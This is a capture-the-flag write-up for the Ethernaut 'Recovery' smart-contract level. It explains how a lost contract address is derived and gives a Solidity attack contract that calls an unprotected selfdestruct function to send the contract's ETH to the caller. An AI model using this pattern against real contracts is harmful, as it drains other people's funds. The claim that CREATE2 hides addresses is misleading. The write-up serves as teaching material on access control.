# Ethernaut #17 — Recovery

## Challenge
`Recovery` factory contract deploys a `SimpleToken`, sends it 0.001 ETH, then "loses" the address. Goal: recover the funds.

## Root Cause
Losing a contract address isn't the same as it being inaccessible. Two independent ways to find it:

1. **On-chain lookup** — the deployment tx and the 0.001 ETH transfer are both public. Etherscan on the `Recovery` instance shows an internal tx to the token address directly.
2. **Deterministic address derivation** — contract addresses from regular `CREATE` are computed as:
   ```
   address = keccak256(rlp([sender, nonce]))[12:]
   ```
   Since `Recovery`'s constructor deploys `SimpleToken` as its first action, nonce = 1. So the address can be derived purely from the factory's address and nonce, without needing any explorer.

Either way, `SimpleToken` is a real deployed contract sitting at a known address with 0.001 ETH in it — "lost" only in the sense that the Ethernaut UI doesn't surface it.

## Exploit
`SimpleToken.destroy(address)` is presumably unprotected (no `onlyOwner`) and does a `selfdestruct` sending remaining balance to the passed address.

```solidity
contract attack {
    Recovery target;
    constructor(address _target) {
        target = Recovery(_target);
    }

    function attackContract() public {
        SimpleToken(payable(0xACcE5Ad336B34Da1252737B7b40df2Fa4e10fE02))
            .destroy(payable(tx.origin));
    }
}
```
Just call `destroy` on the recovered address, forwarding funds to `tx.origin`.

## Lesson
- "Address unknown" is not a security boundary — anything derivable or publicly logged should be treated as public.
- `CREATE` addresses are fully deterministic from `(deployer, nonce)`. `CREATE2` is the only way to get pre-image resistance on the address itself (via salt).
- Access control belongs on state-changing/fund-moving functions themselves, not on obscurity of the calling path.
